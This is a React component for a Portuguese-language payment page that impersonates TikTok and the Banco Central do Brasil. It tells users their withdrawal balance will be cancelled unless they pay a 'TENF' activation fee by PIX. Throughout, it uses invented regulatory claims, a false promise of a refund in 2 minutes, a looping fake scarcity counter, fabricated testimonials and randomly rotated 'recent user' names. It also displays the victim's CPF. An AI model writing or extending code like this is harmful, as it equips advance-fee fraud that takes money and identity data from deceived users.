import { useState, useEffect } from "react";
import { Loader2, ChevronRight, Shield, AlertTriangle, Lock, Zap, CheckCircle2 } from "lucide-react";
import tiktokLogo from "@/assets/tiktok-logo.png";
import testimonial1 from "@/assets/testimonial-1.jpg";
import testimonial2 from "@/assets/testimonial-2.jpg";
import testimonial3 from "@/assets/testimonial-3.jpg";
import FunnelSecurityBadge from "./FunnelSecurityBadge";
import FunnelActiveUsersCounter from "./FunnelActiveUsersCounter";

interface FunnelUpsellTENFProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; price?: string; anchorPrice?: string; discountLabel?: string; }

const FunnelUpsellTENF = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, price = "R$ 42,91", anchorPrice = "R$ 97,90", discountLabel = "56% OFF" }: FunnelUpsellTENFProps) => {
  const [activationsLeft, setActivationsLeft] = useState(7);
  const [recentUser, setRecentUser] = useState("");
  const recentNames = ["Maria S.", "João P.", "Ana L.", "Carlos R.", "Fernanda M.", "Ricardo T.", "Patrícia G.", "Lucas H.", "Camila D.", "Bruno F."];

  useEffect(() => { const interval = setInterval(() => setActivationsLeft(prev => (prev <= 2 ? 7 : prev - 1)), 25000); return () => clearInterval(interval); }, []);
  useEffect(() => { const pick = () => setRecentUser(recentNames[Math.floor(Math.random() * recentNames.length)]); pick(); const interval = setInterval(pick, 12000); return () => clearInterval(interval); }, []);

  return (
    <div className="fixed inset-0 z-[80] bg-white overflow-y-auto">
      <div className="bg-gray-50 pt-3 pb-4 px-4 border-b border-gray-200">
        <div className="max-w-md mx-auto flex flex-col items-center">
          <img src={tiktokLogo} alt="TikTok" className="h-7 object-contain mb-2" />
          <p className="text-gray-400 text-[10px] mb-0.5">Saldo disponível</p>
          <p className="text-gray-900 text-[28px] font-extrabold leading-none">{balance}</p>
        </div>
      </div>
      <main className="px-4 py-3 space-y-3 max-w-md mx-auto pb-6">
        <div className="bg-red-50 border border-red-200 rounded-xl p-3">
          <div className="flex items-center gap-2 mb-1.5"><AlertTriangle className="w-4 h-4 text-[#FE2C55]" /><span className="text-[#FE2C55] text-xs font-bold uppercase tracking-wide">⛔ Saque Bloqueado</span></div>
          <p className="text-gray-600 text-xs leading-relaxed">Seu saque de <strong className="text-gray-900">{balance}</strong> será <strong className="text-red-600">CANCELADO</strong> em 24h sem o TENF ativado.</p>
        </div>
        {leadCpf && (<div className="bg-gray-50 rounded-lg p-2.5 flex items-center gap-2.5 border border-gray-200"><span className="text-sm">🪪</span><div className="flex-1"><p className="text-gray-800 text-xs font-semibold">{leadName || "Titular"}</p><p className="text-gray-400 text-[10px]">CPF: {leadCpf}</p></div><span className="text-emerald-600 text-[10px] font-bold">Verificado ✓</span></div>)}
        <div className="bg-red-50/50 rounded-xl p-3 border border-red-200 space-y-2">
          <p className="text-red-700 text-xs font-bold">🚨 Sem o TENF:</p>
          <div className="flex items-start gap-2"><Lock className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Saldo <strong className="text-red-600">BLOQUEADO e CANCELADO</strong></span></div>
          <div className="flex items-start gap-2"><AlertTriangle className="w-3.5 h-3.5 text-[#FE2C55] shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Conta <strong className="text-red-600">marcada como irregular</strong></span></div>
          <div className="border-t border-red-200 pt-2 mt-1"><div className="flex items-start gap-2"><Zap className="w-3.5 h-3.5 text-emerald-500 shrink-0 mt-0.5" /><span className="text-gray-600 text-[11px]">Com TENF: valor cai <strong className="text-emerald-700">em até 3 minutos</strong></span></div></div>
        </div>
        <div className="bg-red-600 border border-red-700 rounded-lg px-3 py-2.5 flex items-center justify-center gap-2"><div className="relative"><div className="w-2 h-2 bg-white rounded-full" /><div className="absolute inset-0 w-2 h-2 bg-white rounded-full animate-ping" /></div><span className="text-white text-[11px] font-bold">⚠️ ÚLTIMAS {activationsLeft} VAGAS</span></div>
        <div className="bg-gray-50 rounded-2xl p-4 border border-gray-200">
          <div className="flex items-center justify-between mb-1"><span className="text-gray-500 text-xs">Taxa única de ativação</span><span className="bg-emerald-100 text-emerald-700 text-[10px] font-bold px-2 py-0.5 rounded-full">{discountLabel}</span></div>
          <div className="flex items-baseline gap-2 mb-1"><span className="text-red-400 text-base line-through font-semibold">{anchorPrice}</span><span className="text-gray-900 text-3xl font-extrabold">{price}</span></div>
          <p className="text-emerald-600 text-[11px] font-medium mb-1">✅ Reembolso automático em 2 min</p>
          <p className="text-red-500 text-[10px] font-semibold mb-4">❌ Sem ativação = perda total de {balance}</p>
          <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-base hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
            {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>LIBERAR MEU SAQUE AGORA<ChevronRight className="w-4 h-4" /></>)}
          </button>
          <FunnelSecurityBadge />
        </div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2.5">Perguntas frequentes</p>
          <div className="space-y-2.5">
            <div><p className="text-gray-600 text-[11px] font-semibold">O que é o TENF?</p><p className="text-gray-400 text-[11px] leading-relaxed">Termo Eletrônico de Nota Fiscal, <strong>obrigatório</strong> pelo Banco Central para liberar transferências acima de R$ 1.500.</p></div>
            <div className="border-t border-gray-200 pt-2"><p className="text-gray-600 text-[11px] font-semibold">A taxa é reembolsável?</p><p className="text-gray-400 text-[11px] leading-relaxed">Sim, 100%. Retorna em até 2 minutos. <strong>Risco zero.</strong></p></div>
          </div>
        </div>
        <div className="bg-gray-50 rounded-xl p-3 border border-gray-200">
          <p className="text-gray-700 text-xs font-bold mb-2.5 flex items-center gap-1.5"><CheckCircle2 className="w-3.5 h-3.5 text-emerald-500" />Quem ativou, já sacou</p>
          <div className="space-y-2.5">
            {[{ img: testimonial1, name: "Camila R.", amount: "R$ 3.247", text: "Em 3 minutos caiu na conta!" }, { img: testimonial2, name: "Roberto M.", amount: "R$ 2.891", text: "Fiz na hora e recebi tudo." }, { img: testimonial3, name: "Lucas T.", amount: "R$ 1.956", text: "5 minutos e já tava no banco." }].map((t, i) => (
              <div key={i} className="flex items-center gap-2.5"><img src={t.img} alt="" className="w-7 h-7 rounded-full object-cover shrink-0" loading="lazy" /><div className="flex-1 min-w-0"><div className="flex items-center justify-between"><p className="text-gray-600 text-[11px] font-semibold">{t.name}</p><span className="text-emerald-600 text-[10px] font-bold">{t.amount} ✓</span></div><p className="text-gray-400 text-[10px] truncate">"{t.text}"</p></div></div>
            ))}
          </div>
        </div>
        <FunnelActiveUsersCounter />
        <button onClick={onGeneratePix} disabled={isGenerating} className="w-full py-4 rounded-xl bg-emerald-500 text-white font-bold text-[15px] hover:brightness-110 transition-all active:scale-[0.98] disabled:opacity-70 flex items-center justify-center gap-2 shadow-lg shadow-emerald-500/30" style={{ animation: isGenerating ? 'none' : 'ctaPulse 2s ease-in-out infinite' }}>
          {isGenerating ? (<><Loader2 className="w-4 h-4 animate-spin" />Gerando PIX...</>) : (<>ATIVAR TENF E RECEBER {balance}<ChevronRight className="w-4 h-4" /></>)}
        </button>
        <p className="text-gray-300 text-[9px] text-center pb-2">Taxa regulamentada pelo Banco Central do Brasil</p>
      </main>
      <style>{`@keyframes ctaPulse { 0%, 100% { transform: scale(1); box-shadow: 0 4px 15px rgba(16,185,129,0.3); } 50% { transform: scale(1.02); box-shadow: 0 6px 25px rgba(16,185,129,0.5); } }`}</style>
    </div>
  );
};

export default FunnelUpsellTENF;
